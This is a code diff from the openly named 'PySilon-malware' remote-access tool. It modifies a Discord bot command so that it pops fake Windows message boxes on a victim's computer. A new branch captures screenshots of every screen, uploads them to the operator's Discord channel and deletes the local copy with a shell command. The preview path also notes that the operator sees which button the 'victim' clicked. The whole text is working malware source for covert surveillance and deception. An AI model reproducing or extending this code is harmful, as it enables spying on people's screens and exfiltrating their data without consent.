@@ -39,36 +39,46 @@ elif message.content[:4] == '.msg':
         if 'style=' in message.content[5:]:
             message_style = int(message.content[message.content.find('style=')+6])
 
-        hti = Html2Image()
-        possible_styles = [
-            '<div class="active_button">OK</div>',
-            '<div class="button">Cancel</div><div class="active_button">OK</div>', 
-            '<div class="button">Ignore</div><div class="button">Retry</div><div class="active_button">Abort</div>',
-            '<div class="button">Cancel</div><div class="button">No</div><div class="active_button">Yes</div>',
-            '<div class="button">No</div><div class="active_button">Yes</div>',
-            '<div class="button">Cancel</div><div class="active_button">Retry</div>',
-            '<div class="button">Continue</div><div class="button">Try Again</div><div class="active_button">Cancel</div>'
-        ]
-        
-        hti.screenshot(
-            html_str='''<head><style>body {margin: 0px;}.container {width: 285px;min-height: 100px;background-color: #ffffff;border: 1px solid black;}.title {margin: 8px;width: 85%;font-size: 13.25px;font-family: 'Calibri';float: left;overflow: hidden;white-space: nowrap;text-overflow: ellipsis;}.close {float: right;font-size: 9px;padding: 8px;}.text {margin-left: 10px;margin-top: 20px;margin-bottom: 25px;float: left;inline-size: 90%;word-break: break-all;font-size: 13px;font-family: 'Calibri';}.footer {background-color: #f0f0f0;width: auto;height: 40px;padding-right: 12px;clear: both;}.button {background-color: #e1e1e1;border: 1px solid #adadad;font-size: 13px;font-family: 'Calibri';float: right;padding-top: 2px;padding-bottom: 2px;margin: 5px;margin-top: 10px;width: 70px;text-align: center;}.active_button {background-color: #e1e1e1;border: 2px solid #0078d7;font-size: 13px;font-family: 'Calibri';float: right;padding-top: 2px;padding-bottom: 2px;margin: 5px;margin-top: 10px;width: 70px;text-align: center;}</style></head><body><div class="container"><div class="title">''' + message_title + '''</div><div class="close"><b>&#9587;</b></div><div class="text">''' + message_text + '''</div><div class="footer">''' + possible_styles[int(message_style)] + '''</div></div></body></html>''',
-            size=(500, 300),
-            save_as='image.png'
-        )
 
-        img = Image.open('image.png')
-        content = img.getbbox()
-        img = img.crop(content)
-        img.save('image.png')
+        if message.content[-2:] == '/s':
+            threading.Thread(target=send_custom_message, args=(message_title, message_text, message_style,)).start()
+            await asyncio.sleep(0.5)
+            ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png')
+            reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[Sent message]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png'))
+            await reaction_msg.add_reaction('📌')
+            subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png', shell=True)
+        else:
+            hti = Html2Image()
+            possible_styles = [
+                '<div class="active_button">OK</div>',
+                '<div class="button">Cancel</div><div class="active_button">OK</div>', 
+                '<div class="button">Ignore</div><div class="button">Retry</div><div class="active_button">Abort</div>',
+                '<div class="button">Cancel</div><div class="button">No</div><div class="active_button">Yes</div>',
+                '<div class="button">No</div><div class="active_button">Yes</div>',
+                '<div class="button">Cancel</div><div class="active_button">Retry</div>',
+                '<div class="button">Continue</div><div class="button">Try Again</div><div class="active_button">Cancel</div>'
+            ]
+            
+            hti.screenshot(
+                html_str='''<head><style>body {margin: 0px;}.container {width: 285px;min-height: 100px;background-color: #ffffff;border: 1px solid black;}.title {margin: 8px;width: 85%;font-size: 13.25px;font-family: 'Calibri';float: left;overflow: hidden;white-space: nowrap;text-overflow: ellipsis;}.close {float: right;font-size: 9px;padding: 8px;}.text {margin-left: 10px;margin-top: 20px;margin-bottom: 25px;float: left;inline-size: 90%;word-break: break-all;font-size: 13px;font-family: 'Calibri';}.footer {background-color: #f0f0f0;width: auto;height: 40px;padding-right: 12px;clear: both;}.button {background-color: #e1e1e1;border: 1px solid #adadad;font-size: 13px;font-family: 'Calibri';float: right;padding-top: 2px;padding-bottom: 2px;margin: 5px;margin-top: 10px;width: 70px;text-align: center;}.active_button {background-color: #e1e1e1;border: 2px solid #0078d7;font-size: 13px;font-family: 'Calibri';float: right;padding-top: 2px;padding-bottom: 2px;margin: 5px;margin-top: 10px;width: 70px;text-align: center;}</style></head><body><div class="container"><div class="title">''' + message_title + '''</div><div class="close"><b>&#9587;</b></div><div class="text">''' + message_text + '''</div><div class="footer">''' + possible_styles[int(message_style)] + '''</div></div></body></html>''',
+                size=(500, 300),
+                save_as='image.png'
+            )
 
-        file = discord.File('image.png', filename='image.png')
-        embed = discord.Embed(title='Confirm message', description=f'Check if message preview meets your expectations:', colour=discord.Colour.green())
-        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-        embed.set_image(url='attachment://image.png')
-        embed.set_footer(text='Note: you will see what button did victim click.')
-        reaction_msg = await message.channel.send(file=file, embed=embed); await reaction_msg.add_reaction('✅'); await reaction_msg.add_reaction('🔴')
-        await message.channel.send('```^ React with ✅ to send the message```')
-        custom_message_to_send = [message_title, message_text, message_style]
+            img = Image.open('image.png')
+            content = img.getbbox()
+            img = img.crop(content)
+            img.save('image.png')
+
+            file = discord.File('image.png', filename='image.png')
+            embed = discord.Embed(title='Confirm message', description=f'Check if message preview meets your expectations:', colour=discord.Colour.green())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            embed.set_image(url='attachment://image.png')
+            embed.set_footer(text='Note: you will see what button did victim click.')
+            reaction_msg = await message.channel.send(file=file, embed=embed); await reaction_msg.add_reaction('✅'); await reaction_msg.add_reaction('🔴')
+            subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\image.png', shell=True)
+            await message.channel.send('```^ React with ✅ to send the message```')
+            custom_message_to_send = [message_title, message_text, message_style]
 
 # anywhere
 def send_custom_message(title, text, style):
